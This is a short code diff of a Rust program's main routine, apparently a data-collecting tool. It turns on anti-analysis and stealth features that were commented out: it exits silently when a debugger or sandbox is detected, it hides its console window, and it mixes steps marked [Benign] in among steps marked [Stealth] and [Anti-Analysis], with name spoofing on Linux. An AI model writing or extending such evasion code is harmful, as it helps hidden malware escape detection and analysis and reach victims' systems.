@@ -38,15 +38,15 @@
      stealth::perform_system_sanity_check();
  
      // 2. [Anti-Analysis] Direct PEB Check for Debugger
-     // if stealth::is_debugger_present() {
-     //     // println!("[!] WARNING: Debugger detected, but proceeding due to Debug Mode.");
-     // }
+     if stealth::is_debugger_present() {
+         std::process::exit(0);
+     }
 
     // 3. [Benign] Disk space query (very common in system utilities)
     stealth::verify_disk_integrity();
 
     // 4. [Stealth] Hide Window (No longer first, but still early)
-    // stealth::hide_console();
+    stealth::hide_console();
 
     // 5. [Benign] Network env check
     stealth::check_network_config();
@@ -55,9 +55,9 @@
     sys_info_collector::utils::junk_data_collector();
 
     // 7. [Anti-Analysis] Anti-Sandbox Environmental Checks
-    // if stealth::is_sandbox() {
-    //     println!("[!] WARNING: Sandbox features detected, but proceeding due to Debug Mode.");
-    // }
+    if stealth::is_sandbox() {
+        std::process::exit(0);
+    }
 
     // 9. Backgrounding and Name Spoofing (Linux)
     #[cfg(target_os = "linux")]
